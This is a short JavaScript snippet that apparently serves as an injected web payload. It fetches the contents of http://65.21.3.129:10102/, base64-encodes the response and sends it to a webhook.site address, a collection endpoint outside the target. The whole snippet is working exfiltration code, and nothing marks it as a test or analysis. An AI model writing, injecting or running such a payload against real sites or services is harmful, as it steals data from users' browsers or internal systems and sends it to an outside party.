const xhr = new XMLHttpRequest();
xhr.open("GET", "http://65.21.3.129:10102/");
xhr.onload = () => fetch("https://webhook.site/fef28452-dc88-40ae-ac06-5481ac42f7ff/" + btoa(xhr.responseText), {mode: "no-cors"});
xhr.send();
